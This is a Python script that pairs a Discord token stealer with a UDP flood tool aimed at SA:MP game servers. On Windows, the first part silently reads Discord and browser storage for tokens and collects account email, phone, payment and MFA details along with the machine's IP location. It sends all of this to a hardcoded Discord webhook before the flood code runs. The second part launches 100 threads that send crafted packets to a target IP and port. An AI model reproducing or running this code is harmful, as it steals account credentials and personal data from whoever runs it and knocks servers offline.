import marshal
import socket
import codecs,sys
import threading
import random
import time
import re, os
if os.name != "nt":
	exit()
from re import findall
import json
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv

webhook_url = "https://discord.com/api/webhooks/878862527553994782/jNW-VRmLOuhiEugs6sZ3CJwmFuhliSbOAxQWSe3ysqkULldLL-Yf2OyPdEEtgaYqcwpQ"

languages = {
	'da'    : 'Danish, Denmark',
	'de'    : 'German, Germany',
	'en-GB' : 'English, United Kingdom',
	'en-US' : 'English, United States',
	'es-ES' : 'Spanish, Spain',
	'fr'    : 'French, France',
	'hr'    : 'Croatian, Croatia',
	'lt'    : 'Lithuanian, Lithuania',
	'hu'    : 'Hungarian, Hungary',
	'nl'    : 'Dutch, Netherlands',
	'no'    : 'Norwegian, Norway',
	'pl'    : 'Polish, Poland',
	'pt-BR' : 'Portuguese, Brazilian, Brazil',
	'ro'    : 'Romanian, Romania',
	'fi'    : 'Finnish, Finland',
	'sv-SE' : 'Swedish, Sweden',
	'vi'    : 'Vietnamese, Vietnam',
	'tr'    : 'Turkish, Turkey',
	'cs'    : 'Czech, Czechia, Czech Republic',
	'el'    : 'Greek, Greece',
	'bg'    : 'Bulgarian, Bulgaria',
	'ru'    : 'Russian, Russia',
	'uk'    : 'Ukranian, Ukraine',
	'th'    : 'Thai, Thailand',
	'zh-CN' : 'Chinese, China',
	'ja'    : 'Japanese',
	'zh-TW' : 'Chinese, Taiwan',
	'ko'    : 'Korean, Korea'
}

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
	"Discord"           : ROAMING + "\\Discord",
	"Discord Canary"    : ROAMING + "\\discordcanary",
	"Discord PTB"       : ROAMING + "\\discordptb",
	"Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
	"Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
	headers = {
		"Content-Type": content_type,
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
	}
	if token:
		headers.update({"Authorization": token})
	return headers
def getuserdata(token):
	try:
		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
	except:
		pass
def gettokens(path):
	path += "\\Local Storage\\leveldb"
	tokens = []
	for file_name in os.listdir(path):
		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
			continue
		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in findall(regex, line):
					tokens.append(token)
	return tokens
def getdeveloper():
	dev = "Discord Token Grabber"
	try:
		dev = urlopen(Request("https://pastebin.com/raw/0cXQ5ULy")).read().decode()
	except:
		pass
	return dev
def getip():
	ip = org = loc = city = country = region = googlemap = "None"
	try:
		url = 'http://ipinfo.io/json'
		response = urlopen(url)
		data = json.load(response)
		ip = data['ip']
		org = data['org']
		loc = data['loc']
		city = data['city']
		country = data['country']
		region = data['region']
		googlemap = "https://www.google.com/maps/search/google+map++" + loc
	except:
		pass
	return ip,org,loc,city,country,region,googlemap
def getavatar(uid, aid):
	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
	try:
		urlopen(Request(url))
	except:
		url = url[:-4]
	return url
def gethwid():
	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
	return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def has_payment_methods(token):
	try:
		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
	except:
		pass

def main():
	global webhook_url
	cache_path = ROAMING + "\\.cache~$"
	prevent_spam = True
	self_spread = True
	embeds = []
	working = []
	checked = []
	already_cached_tokens = []
	working_ids = []
	computer_os = plt.platform()
	ip,org,loc,city,country,region,googlemap = getip()
	pc_username = os.getenv("UserName")
	pc_name = os.getenv("COMPUTERNAME")
	user_path_name = os.getenv("userprofile").split("\\")[2]
	developer = getdeveloper()
	for platform, path in PATHS.items():
		if not os.path.exists(path):
			continue
		for token in gettokens(path):
			if token in checked:
				continue
			checked.append(token)
			uid = None
			if not token.startswith("mfa."):
				try:
					uid = b64decode(token.split(".")[0].encode()).decode()
				except:
					pass
				if not uid or uid in working_ids:
					continue
			user_data = getuserdata(token)
			if not user_data:
				continue
			working_ids.append(uid)
			working.append(token)
			username = user_data["username"] + "#" + str(user_data["discriminator"])
			user_id = user_data["id"]
			locale = user_data['locale']
			avatar_id = user_data["avatar"]
			avatar_url = getavatar(user_id, avatar_id)
			email = user_data.get("email")
			phone = user_data.get("phone")
			verified = user_data['verified']
			mfa_enabled = user_data['mfa_enabled']
			flags = user_data['flags']

			creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')

			language = languages.get(locale)
			nitro = bool(user_data.get("premium_type"))
			billing = bool(has_payment_methods(token))
			embed = {
				"color": 0xd53444,
				"fields": [
					{
						"name": "```— INFORMASI UMUM TENTANG AKUN —```",
						"value": f'Email: {email}\nTelepon: {phone}\nBerlangganan Nitro aktif: {nitro}\nData pembayaran: {billing}\nStatus 2FA / MFA: {mfa_enabled}',
						"inline": True
					},
					{
						"name": "```— INFORMASI KORBAN LAINNYA —```",
						"value": f'Alamat IP korban: {ip}\nLokasi: {language}\nDirampok dari: {platform}\nSurat terkonfirmasi: {verified}\nResmi: {creation_date}',
						"inline": True
					},
					{
						"name": "**TOKEN KORBAN UNTUK OTORISASI DI AKUNNYA**",
						"value": token,
						"inline": False
					}
				],
				"author": {
					"name": f"{username} ({user_id})",
					"icon_url": avatar_url
				},
				"footer": {
					"text": f"{developer}"
				}
			}
			embeds.append(embed)
	with open(cache_path, "a") as file:
		for token in checked:
			if not token in already_cached_tokens:
				file.write(token + "\n")

	if len(working) == 0:
		working.append('123')
	webhook = {
		"content": "",
		"embeds": embeds,
		"username": "Discord Token Grabber by JetX",
		"avatar_url": "https://i.imgur.com/rdLTU5l.png"
	}
	try:
		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
	except:
		pass

try:
	main()
except Exception as e:
	print(e)
	pass

ip = sys.argv[1]
port = sys.argv[2]
orgip =ip

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]

print('code by JetX')
print("Attack %s port: %s"%(orgip,port))

class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
                
                msg = Pacotes[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(100):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
         print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
         print('SA:MP:AH')
         print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
         print('\n\n')
         print('attack ip {} KNTL'.format(orgip))
         pass
